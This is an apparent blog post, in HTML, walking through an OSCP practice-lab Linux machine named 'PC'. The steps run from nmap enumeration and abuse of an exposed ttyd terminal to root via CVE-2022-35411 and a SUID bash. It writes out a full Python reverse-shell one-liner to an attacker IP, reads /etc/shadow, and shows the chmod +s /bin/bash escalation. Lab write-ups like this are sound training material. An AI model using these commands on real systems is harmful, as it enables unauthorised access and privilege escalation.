@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>OSCP - PC - Linux :: Digital Garden</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="PC This was an interesting one, with linpeas showing multiple vulnerabilities and yet the most obvious two didn&rsquo;t work because of missing dependencies and no user credentials.
+Figuring out how rpcpy-exploit worked was interesting, but the real lesson here was understanding how if the SUID binary can be set then you can run Bash in privileged mode with /bin/bash -p and become root
+Resolution summary Ran Nmap to identify ports 22 &amp; 8000 Visited http (8000) &amp; identified ttyd Created reverse shell and enumerated target Ran linpeas.sh and identified multiple vulnerabilities and rpc.sh script Identified exploit for rpc.sh and used it to modify /bin/bash set permission Used /bin/bash -p to switch to root Improved skills Identifying vulnerabilities &amp; scripts with linpeas.sh Used tools nmap ttyd python Information Gathering Scanned all TCP ports:
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/oscp---pc---linux/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+<link rel="stylesheet" href="/terminal.css">
+
+
+
+
+<link rel="shortcut icon" href="/favicon.png">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="OSCP - PC - Linux">
+<meta property="og:description" content="PC This was an interesting one, with linpeas showing multiple vulnerabilities and yet the most obvious two didn&rsquo;t work because of missing dependencies and no user credentials.
+Figuring out how rpcpy-exploit worked was interesting, but the real lesson here was understanding how if the SUID binary can be set then you can run Bash in privileged mode with /bin/bash -p and become root
+Resolution summary Ran Nmap to identify ports 22 &amp; 8000 Visited http (8000) &amp; identified ttyd Created reverse shell and enumerated target Ran linpeas.sh and identified multiple vulnerabilities and rpc.sh script Identified exploit for rpc.sh and used it to modify /bin/bash set permission Used /bin/bash -p to switch to root Improved skills Identifying vulnerabilities &amp; scripts with linpeas.sh Used tools nmap ttyd python Information Gathering Scanned all TCP ports:
+" />
+<meta property="og:url" content="/posts/oscp---pc---linux/" />
+<meta property="og:site_name" content="Digital Garden" />
+
+  <meta property="og:image" content="/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Digital Garden
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about" >About</a></li>
+        
+      
+        
+          <li><a href="/showcase" >Showcase</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/oscp---pc---linux/">OSCP - PC - Linux</a>
+  </h1>
+  <div class="post-meta"></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="pc">PC<a href="#pc" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>This was an interesting one, with <code>linpeas</code> showing multiple vulnerabilities and yet the most obvious two didn&rsquo;t work because of missing dependencies and no user credentials.</p>
+<p>Figuring out how <code>rpcpy-exploit</code> worked was interesting, but the real lesson here was understanding how if the SUID binary can be set then you can run Bash in privileged mode with <code>/bin/bash -p</code> and become <code>root</code></p>
+<h1 id="resolution-summary">Resolution summary<a href="#resolution-summary" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<ul>
+<li>Ran Nmap to identify ports <code>22</code> &amp; <code>8000</code></li>
+<li>Visited http (<code>8000</code>) &amp; identified <code>ttyd</code></li>
+<li>Created reverse shell and enumerated target</li>
+<li>Ran <code>linpeas.sh</code> and identified multiple vulnerabilities and <code>rpc.sh</code> script</li>
+<li>Identified exploit for <code>rpc.sh</code> and used it to modify <code>/bin/bash</code> set permission</li>
+<li>Used <code>/bin/bash -p</code> to switch to <code>root</code></li>
+</ul>
+<h2 id="improved-skills">Improved skills<a href="#improved-skills" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Identifying vulnerabilities &amp; scripts with <code>linpeas.sh</code></li>
+</ul>
+<h2 id="used-tools">Used tools<a href="#used-tools" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>nmap</li>
+<li>ttyd</li>
+<li>python</li>
+</ul>
+<hr>
+<h1 id="information-gathering">Information Gathering<a href="#information-gathering" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>Scanned all TCP ports:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -sC -sV -oN PC.nmap 192.168.215.210 -v
+</span></span></code></pre></div><p>Enumerated open TCP ports:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT     STATE SERVICE  VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">8000/tcp open  http-alt ttyd/1.7.3-a2312cb <span class="o">(</span>libwebsockets/3.2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: ttyd - Terminal
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: ttyd/1.7.3-a2312cb <span class="o">(</span>libwebsockets/3.2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   FourOhFourRequest: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.0 <span class="m">404</span> Not Found
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     server: ttyd/1.7.3-a2312cb <span class="o">(</span>libwebsockets/3.2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     content-type: text/html
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     content-length: <span class="m">173</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;html&gt;&lt;head&gt;&lt;meta <span class="nv">charset</span><span class="o">=</span>utf-8 http-equiv<span class="o">=</span><span class="s2">&#34;Content-Language&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;en&#34;</span>/&gt;&lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;text/css&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/error.css&#34;</span>/&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;404&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   GetRequest: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.0 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     server: ttyd/1.7.3-a2312cb <span class="o">(</span>libwebsockets/3.2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     content-type: text/html
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     content-length: <span class="m">677047</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;!DOCTYPE html&gt;&lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span>&gt;&lt;head&gt;&lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span>&gt;&lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;X-UA-Compatible&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;IE=edge,chrome=1&#34;</span>&gt;&lt;title&gt;ttyd - Terminal&lt;/title&gt;&lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;icon&#34;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;image/png&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAcCAYAAAAAwr0iAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA0xpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMDY3IDc5LjE1Nzc0NywgMjAxNS8wMy8zMC0yMzo0MDo0MiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vb
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   Socks5, X11Probe: 
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     HTTP/1.0 403 Forbidden
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     server: ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     content-type: text/html
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     content-length: 173
+</span></span></span><span class="line"><span class="cl"><span class="s2">|_    &lt;html&gt;&lt;head&gt;&lt;meta charset=utf-8 http-equiv=&#34;</span>Content-Language<span class="s2">&#34; content=&#34;</span>en<span class="s2">&#34;/&gt;&lt;link rel=&#34;</span>stylesheet<span class="s2">&#34; type=&#34;</span>text/css<span class="s2">&#34; href=&#34;</span>/error.css<span class="s2">&#34;/&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;403&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">1 service unrecognized despite returning data.
+</span></span></span></code></pre></div><hr>
+<h1 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<h2 id="port-22---ssh-openssh-79p1">Port 22 - SSH (OpenSSH 7.9p1)<a href="#port-22---ssh-openssh-79p1" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>No enumeration conducted</p>
+<h2 id="port-8000---http-ttyd-alt">Port 8000 - HTTP (ttyd-alt)<a href="#port-8000---http-ttyd-alt" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Navigated to <code>http://192.168.215.210:8000</code>, found <code>ttyd</code> service running, and enumerated available directories
+<img src="/images/OSCP%20-%20PC%20-%20Linux%20-%20image1.png" alt="OSCP PC Linux Image1"></li>
+<li>Ran <code>cat /etc/passwd</code> to find other users, and <code>cat /etc/shadow</code> to test shadow file
+<img src="/images/OSCP%20-%20PC%20-%20Linux%20-%20image2.png" alt="OSCP PC Linux Image2"></li>
+<li>Ran <code>ttyd -h</code> to view TTYD help, then checked version
+<img src="/images/OSCP%20-%20PC%20-%20Linux%20-%20image3.png" alt="OSCP PC Linux Image3"></li>
+<li>Ran <code>ps aux</code> to identify running processes and identified <code>python3 /opt/rpy.py</code> running under <code>root</code> - potentially vulnerable to CVE-2022-35411
+<img src="/images/OSCP%20-%20PC%20-%20Linux%20-%20image4.png" alt="OSCP PC Linux Image4"></li>
+<li>Started netcat listener on port 4444 and created reverse shell with command <code>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.45.250&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/sh&quot;)'</code>
+<img src="/images/OSCP%20-%20PC%20-%20Linux%20-%20image5.png" alt="OSCP PC Linux Image5"></li>
+<li>Upgraded shell, uploaded <code>suid3num.py</code> from <a href="https://github.com/Anon-Exploiter/SUID3NUM">Anon-Exploiter</a>, and executed python script for no exploitable binaries.
+<img src="/images/OSCP%20-%20PC%20-%20Linux%20-%20image6.png" alt="OSCP PC Linux Image6"></li>
+<li>Uploaded <code>linpeas.sh</code> and executed script
+<img src="/images/OSCP%20-%20PC%20-%20Linux%20-%20image7.png" alt="OSCP PC Linux Image7"></li>
+<li>Identified sudo version 1.8.3 - potentially vulnerable to CVE-2021-3156</li>
+<li>Identified vulnerable to CVE-2021-3560</li>
+<li>Identified process <code>1045</code> run by <code>user</code> but ppid is <code>root</code>
+<img src="/images/OSCP%20-%20PC%20-%20Linux%20-%20image10.png" alt="OSCP PC Linux Image10"></li>
+<li>Identified potentially vulnerable Pkexec policy for user
+<img src="/images/OSCP%20-%20PC%20-%20Linux%20-%20image11.png" alt="OSCP PC Linux Image11">
+<ul>
+<li>Checked <code>pkexe</code> binary permissions
+<img src="/images/OSCP%20-%20PC%20-%20Linux%20-%20image12.png" alt="OSCP PC Linux Image12"></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h1 id="exploitation">Exploitation<a href="#exploitation" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<h2 id="cve-2021-3560">CVE-2021-3560<a href="#cve-2021-3560" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Uploaded <code>poc.sh</code> and attempted to exploit Polkit privesc - missing <code>Accounts service</code> and <code>gnome-control-center</code>
+<img src="/images/OSCP%20-%20PC%20-%20Linux%20-%20image13.png" alt="OSCP PC Linux Image13"></li>
+</ul>
+<h2 id="cve-2023-22809">CVE-2023-22809<a href="#cve-2023-22809" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Uploaded <code>exploit.sh</code> from [https://github.com/asepsaepdin/CVE-2023-22809/blob/main/exploit.sh] and attempted to exploit <code>sudo v1.8.3</code> privesc - do not have <code>user</code> password
+<img src="/images/OSCP%20-%20PC%20-%20Linux%20-%20image14.png" alt="OSCP PC Linux Image14"></li>
+</ul>
+<hr>
+<h1 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<h2 id="cve-2022-35411">CVE-2022-35411<a href="#cve-2022-35411" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Modified <code>rpcpy-exploit.py</code> from [https://github.com/ehtec/rpcpy-exploit/blob/main/rpcpy-exploit.py] to execute <code>chmod +s /bin/bash</code> on target as <code>root</code>
+<img src="/images/OSCP%20-%20PC%20-%20Linux%20-%20image15.png" alt="OSCP PC Linux Image15"></li>
+<li>Ran <code>python3 rpcpy-exploit.py</code> on target, then ran <code>/bin/bash -p</code> to run Bash as <code>root</code>
+<img src="/images/OSCP%20-%20PC%20-%20Linux%20-%20image16.png" alt="OSCP PC Linux Image16"></li>
+<li>Ran <code>cat /root/proof.txt</code> for flag <code>0d69ed51214ecceb8e06fe516da4785e</code>
+<img src="/images/OSCP%20-%20PC%20-%20Linux%20-%20image17.png" alt="OSCP PC Linux Image17"></li>
+</ul>
+<hr>
+<h1 id="trophy--loot">Trophy &amp; Loot<a href="#trophy--loot" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p><code>root.txt</code> = <code>0d69ed51214ecceb8e06fe516da4785e</code></p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Read other posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+      <a href="/posts/oscp---ochima---linux/" class="button inline prev">
+        &lt; [<span class="button__text">OSCP - Ochima - Linux</span>]
+      </a>
+    
+    
+      ::
+    
+    
+      <a href="/posts/oscp---pelican---linux/" class="button inline next">
+         [<span class="button__text">OSCP - Pelican - Linux</span>] &gt;
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
